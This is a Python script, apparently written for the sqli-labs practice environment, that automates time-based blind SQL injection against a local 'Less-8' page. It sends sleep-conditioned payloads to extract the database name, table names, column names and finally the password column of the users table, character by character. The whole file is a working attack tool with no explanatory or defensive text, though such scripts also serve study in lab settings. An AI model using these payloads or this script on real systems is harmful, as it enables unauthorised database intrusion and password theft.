# coding:utf-8
from threading import Thread
import requests
import datetime
import time

result = ''
url = "http://192.168.3.141/sqli/Less-8?id=1'"


# 获取数据库名长度
def database_len():
    global result
    for i in range(1, 10):
        payload = " and if(length(database())>%s,sleep(3),0) --+" % i
        # print(url+payload)
        time1 = datetime.datetime.now()
        r = requests.get(url + payload)
        time2 = datetime.datetime.now()
        sec = (time2 - time1).seconds
        if sec >= 3:
            print(i)
        else:
            print(i)
            print('database_len:', i)
            result += '数据库名长度:' + str(i) + '\t\n'
            break


# 获取数据库名
def database_name():
    global result
    database = ''
    for j in range(1, 20):
        for i in '0123456789abcdefghijklmnopqrstuvwxyz!@#$%^&*()_-=,:':
            payload = " and if(substr(database(),%d,1)='%s',sleep(3),1) --+" % (j, i)
            # print(url+payload)
            time1 = datetime.datetime.now()
            r = requests.get(url + payload)
            time2 = datetime.datetime.now()
            sec = (time2 - time1).seconds
            if sec >= 3:
                database += i
                print(database)
                break
            elif i == ':':
                print('database_name:', database)
                result += '数据库名:' + database + '\t\n'
                print("获取数据库名结束~~~")
                return


# 获取表名
def table_name():
    global result
    tables = ''

    for j in range(1, 100):
        for i in '0123456789abcdefghijklmnopqrstuvwxyz!@#$%^&*()_-=,:':
            payload = " and if(substr((" \
                      "select group_concat(table_name) from information_schema.tables " \
                      "where table_schema=database()),%d,1)='%s',sleep(3),1) --+" % (j, i)
            # print(url+payload)
            time1 = datetime.datetime.now()
            r = requests.get(url + payload)
            time2 = datetime.datetime.now()
            sec = (time2 - time1).seconds
            if sec >= 3:
                tables += i
                print(tables)
                break
            elif i == ':':
                print('tables_name:', tables)
                result += '表名:' + tables + '\t\n'
                print("获取表名结束~~~")
                return


# 获取列名
def column_name():
    global result
    clumns = ''
    for j in range(1, 200):
        for i in '0123456789abcdefghijklmnopqrstuvwxyz!@#$%^&*()_-=,:':
            payload = " and if(substr((" \
                      "select group_concat(column_name) from information_schema.columns " \
                      "where table_schema=database()),%d,1)='%s',sleep(3),1) --+" % (j, i)
            # print(url+payload)
            time1 = datetime.datetime.now()
            r = requests.get(url + payload)
            time2 = datetime.datetime.now()
            sec = (time2 - time1).seconds
            if sec >= 3:
                clumns += i
                print(clumns)
                break
            elif i == ':':
                print('clumn_name:', clumns)
                result += '列名:' + clumns + '\t\n'
                print("获取列名结束~~~")
                return


def select():
    global result
    content = ''
    for j in range(1, 200):
        for i in '0123456789abcdefghijklmnopqrstuvwxyz!@#$%^&*()_-=,:':
            payload = " and if(substr((" \
                      "select group_concat(password) from users),%d,1)='%s',sleep(3),1) --+" % (j, i)
            # print(url+payload)
            time1 = datetime.datetime.now()
            r = requests.get(url + payload)
            time2 = datetime.datetime.now()
            sec = (time2 - time1).seconds
            if sec >= 3:
                content += i
                print(content)
                break
            elif i == ':':
                print('content:', content)
                result += '查询结果:' + content + '\t\n'
                print("完成查询内容~~~")
                return


t1 = Thread(target=database_name)
t2 = Thread(target=table_name)
t3 = Thread(target=column_name)
t4 = Thread(target=database_len)
t5 = Thread(target=select)

if __name__ == '__main__':
    # t1.start()
    # t2.start()
    # t3.start()
    # t4.start()
    #
    # t1.join()
    # t2.join()
    # t3.join()
    # t4.join()
    t5.start()
    t5.join()
    print(result)
